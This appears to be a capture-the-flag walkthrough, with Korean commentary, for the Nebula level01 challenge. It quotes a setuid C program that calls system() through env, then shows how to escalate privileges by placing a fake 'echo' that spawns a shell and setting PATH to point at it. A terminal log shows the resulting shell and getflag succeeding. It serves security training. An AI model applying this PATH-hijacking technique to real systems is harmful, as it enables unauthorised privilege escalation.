# Level 01

## Plot

### About

There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.

### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

## 환경변수를 조작하자

`/home/level01`에 `/bin/sh`을 실행하는 `echo` 프로그램을 하나 만들어 놓는다. 
그리고 `PATH` 환경변수 값을 없애고 `/home/level01`만 넣어 놓으면 `flag01` 프로그램에서 호출하는 `system` 함수의 `echo`는
임의로 우리가 생성한 `echo` 프로그램이 되고, 우리는 `flag01`의 권한으로 `/bin/sh`을 실행할 수 있게 된다.

```text
level01@nebula:/home/flag01$ ls -al
total 13
drwxr-x--- 2 flag01 level01   92 2011-11-20 21:22 .
drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
-rw-r--r-- 1 flag01 flag01   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag01 flag01  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01
-rw-r--r-- 1 flag01 flag01   675 2011-05-18 02:54 .profile
level01@nebula:/home/flag01$ PATH=/home/level01
level01@nebula:/home/flag01$ /usr/bin/env
TERM=xterm-256color
SHELL=/bin/sh
...
PATH=/home/level01
...
_=/usr/bin/env
level01@nebula:/home/flag01$ ./flag01
sh-4.2$ /bin/getflag
You have successfully executed getflag on a target account
```

좀 어거지로 한 느낌이 있긴 한데... 다른 사람들의 풀이를 살펴보자.